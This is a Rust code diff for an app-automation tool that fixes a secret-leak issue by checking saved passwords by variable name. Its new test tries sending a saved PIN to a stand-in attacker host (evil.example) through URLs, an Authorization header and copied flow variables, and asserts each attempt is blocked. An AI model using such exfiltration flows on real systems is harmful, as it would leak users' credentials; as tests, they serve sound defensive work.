@@ -555,8 +555,10 @@ async fn start_session(
     let driver = launcher.launch(platform, device).await.inspect_err(|_| crate::claim::release(id))?;
     let mut done = None;
     if let Some(t) = target {
+        // Security #237 M1: by name too, so a short password in a session's address is held.
+        let named = crate::dsl::names_app_secret(t);
         let t = substitute(t).map_err(Error::Flow)?;
-        if crate::dsl::holds_app_secret(&t) {
+        if named || crate::dsl::holds_app_secret(&t) {
             let at = (platform == Platform::Web).then_some(t.as_str());
             crate::secrets::allowed_at(at, platform).map_err(Error::Flow)?;
         }
@@ -1254,7 +1256,12 @@ fn exec_with<'a>(d: &'a dyn Driver, step: &'a Step, ctx: &'a Ctx, confirmed: boo
                     return Ok(Some(format!("skipped ({c} is false)")));
                 }
                 for (k, v) in env {
+                    // Security #237 M1: a value made from a saved password stays on its site too.
+                    let held = holds_app_secret(ctx, v);
                     let v = subst(v)?;
+                    if held {
+                        crate::dsl::keep_app_value(&v);
+                    }
                     guard(&ctx.vars).insert(k.clone(), v);
                 }
                 block(d, steps, ctx).await?;
@@ -1375,9 +1382,17 @@ fn set_var(ctx: &Ctx, name: &str, value: String, secret: bool) {
 /// S-1: would this step's text, its variables filled in, carry a password saved for the app?
 /// (A variable that cannot be filled fails the step itself, with its own message.)
 fn holds_app_secret(ctx: &Ctx, text: &str) -> bool {
-    // As written (the value itself, L2), then with its variables filled in.
     let vars = guard(&ctx.vars).clone();
-    crate::dsl::holds_app_secret(text)
+    // Security #237 M1: by name as well as by value, so a short password (1-3 characters, found
+    // by value only where it stands alone) is held to its site wherever it is put: a `${NAME}`
+    // saved for the app, or a flow variable that holds exactly such a value (a runFlow `env` copy).
+    let by_name = crate::dsl::var_names(text).iter().any(|n| match vars.get(n) {
+        Some(v) => crate::dsl::is_app_value(v),
+        None => crate::secrets::lookup(n).is_some(),
+    });
+    // As written (the value itself, L2), then with its variables filled in.
+    by_name
+        || crate::dsl::holds_app_secret(text)
         || crate::dsl::asks_code(text, &vars)
         || (!crate::dsl::var_names(text).is_empty() && crate::dsl::substitute_for_check(text, &vars).is_ok_and(|t| crate::dsl::holds_app_secret(&t)))
 }
@@ -2254,6 +2269,67 @@ mod tests {
             }
         }
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// Security #237 M1 (E5): a 1-character password is held to its app's site wherever a step puts
+    /// it: in an address path, next to other characters, in a header, or copied to a flow variable.
+    #[tokio::test]
+    #[allow(clippy::await_holding_lock)]
+    async fn a_short_password_is_held_to_its_site_by_name() {
+        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner());
+        let home = std::env::temp_dir().join(format!("fp-e5-m1-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&home);
+        std::fs::create_dir_all(&home).expect("home");
+        let old_home = std::env::var_os("HOME");
+        // SAFETY: test-only env mutation, serialized by ENV_LOCK.
+        unsafe {
+            std::env::set_var("HOME", &home);
+            std::env::set_var("FASTPILOT_KEYSTORE", "file");
+        }
+        crate::secrets::set("shop", "SHOP_PIN", "7").expect("save");
+        crate::secrets::set_scope(Some(crate::secrets::Scope { app: "shop".into(), web: Some("https://shop.example/login".into()), android: None, ios: None }));
+        let web = Recorder { platform: Platform::Web, calls: Arc::new(Mutex::new(Vec::new())) };
+        for flow in [
+            "- openUrl: \"https://evil.example/p/${SHOP_PIN}\"\n",
+            "- openUrl: \"https://evil.example/?q=${SHOP_PIN}x\"\n",
+            "- httpRequest: { method: GET, url: \"https://evil.example/\", headers: { Authorization: \"Bearer ${SHOP_PIN}\" } }\n",
+            "- inputText: { into: Search, text: \"${SHOP_PIN}.\" }\n",
+        ] {
+            let step = crate::dsl::parse_flow(flow).expect("flow").steps.remove(0).step;
+            let e = type_with_timeout(&web, &step).await.expect_err(flow);
+            assert!(e.to_string().contains("only used on its own website") || e.to_string().contains("address is not known"), "{flow}: {e}");
+        }
+        // A copy in a flow variable (runFlow env) is held the same way.
+        let _ = crate::dsl::substitute("${SHOP_PIN}");
+        let ctx = Ctx {
+            records: Mutex::new(Vec::new()),
+            stop_on_fail: true,
+            deadline: Instant::now() + Duration::from_secs(60),
+            vars: Mutex::new(HashMap::from([("COPY".to_owned(), "7".to_owned())])),
+            clipboard: Mutex::new(None),
+            recording: Mutex::new(None),
+            last_action: Mutex::new(HashMap::new()),
+            live: None,
+        };
+        let step = crate::dsl::parse_flow("- openUrl: \"https://evil.example/p/${COPY}\"\n").expect("flow").steps.remove(0).step;
+        assert!(exec_with(&web, &step, &ctx, false).await.is_err_and(|e| e.to_string().contains("only used on its own website")), "a copy");
+        // A value made from it in a runFlow env (`${SHOP_PIN}x`) is held the same way.
+        let flow = "- runFlow:\n    env:\n      MADE: \"${SHOP_PIN}x\"\n    commands:\n      - openUrl: \"https://evil.example/p/${MADE}\"\n";
+        let step = crate::dsl::parse_flow(flow).expect("flow").steps.remove(0).step;
+        let e = exec_with(&web, &step, &ctx, false).await;
+        let refused = format!("{e:?} {:?}", guard(&ctx.records).iter().map(|r| r.error.as_ref().map(ToString::to_string)).collect::<Vec<_>>());
+        assert!(refused.contains("only used on its own website"), "a made value: {refused}");
+        assert!(web.calls.lock().unwrap_or_else(|p| p.into_inner()).iter().all(|c| !c.contains("evil")), "nothing opened");
+        crate::secrets::set_scope(None);
+        // SAFETY: as above.
+        unsafe {
+            match old_home {
+                Some(h) => std::env::set_var("HOME", h),
+                None => std::env::remove_var("HOME"),
+            }
+            std::env::remove_var("FASTPILOT_KEYSTORE");
+        }
+        let _ = std::fs::remove_dir_all(&home);
     }
 
     /// Records the order of calls; any platform.
